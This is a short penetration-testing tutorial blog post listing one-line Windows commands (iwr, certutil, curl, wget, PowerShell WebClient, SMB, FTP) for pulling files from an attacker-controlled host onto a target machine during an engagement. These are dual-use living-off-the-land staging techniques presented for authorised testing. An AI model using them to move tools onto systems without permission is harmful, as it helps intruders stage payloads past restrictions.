---
title: "Transfer Files To A Windows Machine"
layout: single
read_time: true
comments: true
share: true
author_profile: true
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/christopher-burns-Kj2SaNHG-hg-unsplash.jpg
excerpt: "<br><br><br>"
categories:
  - tutorial
tags:
  - cybersecurity
  - penetration testing
---

This section is pulling from my online notes [here](https://calvin-connor.gitbook.io/hacking-notes/general/transferring-files/transferring-files-to-windows), or at https://calvin-connor.gitbook.io/hacking-notes/general/transferring-files/transferring-files-to-windows.

## Overview

During an engagement, you may find certain tools do not exist, outbound ports have been blocked, and sometimes the machine is just too buggy to transfer your files the only way you know how. For this reason, I find it helpful to have an array of tools at my disposal. I would recommend practicing all the below examples until you know every way you can transfer a file in your specific scenario.

## IWR

```
powershell.exe iwr -uri 192.168.1.1/example.txt -o C:\Temp\example.txt
```

There are many options in which you can change this command for your scenario. For instance, if you are already in a PowerShell prompt, you need not include the powershell.exe. Additionally, I have found the .exe in powershell.exe unnecessary. The -o flag can also be written as -OutFile.

The iwr (Invoke Web Request) command can have several other syntaxes, of which I have listed below.

## Certutil

```
certutil.exe -urlcache -f http://192.168.1.1/example.txt example.txt
```

The purpose of the certutil command was originally for certificate and CA management, but by using certain flags we can use it as a built-in file transfer tool.

## Curl

```
curl http://192.168.1.1/example.txt -o example.txt
```

Curl is a Linux command line tool that is now available for Windows CMD.

Curl was added to Windows 10 and later in 2018.

## Wget

```
powershell.exe wget http://192.168.1.1/example.txt -OutFile example.txt
```

wget is a part of PowerShell, so if you are already in a PowerShell prompt, there is no need to include powershell.exe.

## PowerShell

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/putty.exe', 'putty.exe')
```

Compared to iwr, this is a much more complex command. I have, however, found much success in this command where iwr may fail.

## SMB

```
net use 192.168.1.1\share //add credential lines here
copy 192.168.1.1\share\exampe.txt
```

SMB can be extremely useful when you need to regularly transfer files back and forth. I have run into instances where after losing my shell, my added SMB share is no longer functional. To fix this, I simply restart my SMB server under a different name and add it as a new share.

## FTP

```
ftp 192.168.1.1
```

Even if you are using FTP anonymously, you still need to enter the anonymous:anonymous credentials. Inside of FTP, you can always use the help command to see what options are available to you.


